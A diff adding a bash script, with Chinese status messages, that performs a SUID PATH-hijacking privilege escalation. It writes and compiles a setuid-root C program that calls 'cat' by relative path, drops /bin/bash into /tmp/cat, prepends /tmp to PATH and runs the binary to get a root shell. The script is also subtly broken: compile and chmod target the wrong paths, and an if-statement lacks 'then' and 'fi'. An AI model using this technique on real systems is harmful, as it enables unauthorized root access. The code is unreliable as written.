@@ -1,0 +1,45 @@
+#!/bin/bash
+
+function judg_file(){
+    test -e  /opt/code/suider.c
+    if [ $? -eq '0' ]
+    then    
+        echo 'suider.c存在'
+        exit
+    else
+        echo 'suide.c不存在,文件将创建.'
+        touch_suider
+    fi
+}
+
+function touch_suider(){
+    mkdir /opt/code
+    echo "#include <unistd.h>" > /opt/code/suider.c
+    echo "int main() {" >> /opt/code/suider.c
+    echo "setuid(0);" >> /opt/code/suider.c
+    echo "setgid(0);" >> /opt/code/suider.c
+    echo 'system("cat /etc/passwd");' >> /opt/code/suider.c
+    echo "return 0;">> /opt/code/suider.c
+    echo "}" >> /opt/code/suider.c
+    chmod uo+x /opt/code/suider.c
+    gcc suider.c -o suider
+    chmod u+s ./suider.c
+}
+
+function tmp(){
+    echo /bin/bash > /tmp/cat
+    chmod 777 /tmp/cat
+    export PATH=/tmp:$PATH
+    tmp/suider
+    if [ $? -eq '0' ]
+    echo "操作执行完毕"
+    
+}
+
+function init(){
+    judg_file
+    judg_file
+    tmp
+}
+
+init
